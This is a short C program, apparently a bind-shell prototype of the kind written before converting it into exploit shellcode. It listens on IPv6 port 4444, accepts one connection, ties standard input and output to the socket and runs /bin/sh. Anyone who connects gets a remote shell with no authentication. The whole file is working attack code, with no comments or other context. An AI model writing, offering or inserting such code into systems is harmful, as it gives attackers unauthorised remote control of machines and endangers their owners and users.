#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <errno.h>

int main()
{
	int s, c;
	int temp;
	struct sockaddr_in6 sa;
	char *argv[] = {"/bin/sh", NULL};
	s = socket(PF_INET6, SOCK_STREAM, 0);
	memset(&sa, 0, sizeof(struct sockaddr_in6));
	
	sa.sin6_family = AF_INET6;
	sa.sin6_port = htons(4444);
	sa.sin6_addr = in6addr_any;
	bind(s, (struct sockaddr *)&sa, sizeof(sa));

	listen(s, 0);

	c = accept(s, NULL, NULL);
	dup2(c, 0);
	dup2(c, 1);
	dup2(c, 2);
	execve(argv[0], argv, NULL);
	return 0;
}
